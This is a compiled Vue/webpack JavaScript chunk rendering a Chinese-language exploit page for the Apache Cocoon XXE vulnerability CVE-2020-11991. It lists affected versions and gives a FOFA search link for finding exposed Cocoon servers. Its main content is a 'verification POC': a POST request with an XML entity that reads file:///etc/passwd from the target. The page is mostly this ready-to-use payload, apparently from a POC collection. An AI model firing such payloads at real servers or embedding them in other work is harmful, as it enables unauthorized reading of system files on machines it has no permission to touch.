(window.webpackJsonp=window.webpackJsonp||[]).push([[457],{2605:function(t,a,s){"use strict";s.r(a);var n=s(75),e=Object(n.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"apache-cocoon-xml注入-cve-2020-11991"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-cocoon-xml注入-cve-2020-11991"}},[t._v("#")]),t._v(" Apache Cocoon XML注入 CVE-2020-11991")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。")]),t._v(" "),s("p",[t._v("Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。")]),t._v(" "),s("h2",{attrs:{id:"影响版本"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[t._v("#")]),t._v(" 影响版本")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Apache Cocoon <= 2.1.12")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[s("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBcGFjaGUtQ29jb29uIg%3D%3D"}},[t._v('app="Apache-Cocoon"')])],1),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-xml line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[t._v("POST /v2/api/product/manger/getInfo \n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('\x3c!--?xml version="1.0" ?--\x3e')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token doctype"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<!")]),s("span",{pre:!0,attrs:{class:"token doctype-tag"}},[t._v("DOCTYPE")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token name"}},[t._v("replace")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token internal-subset"}},[t._v('<!ENTITY ent SYSTEM "file:///etc/passwd"> ')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("userInfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("firstName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("John"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("firstName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("lastName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token entity named-entity",title:"&ent;"}},[t._v("&ent;")]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("lastName")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("userInfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br")])])],1)}),[],!1,null,null,null);a.default=e.exports}}]);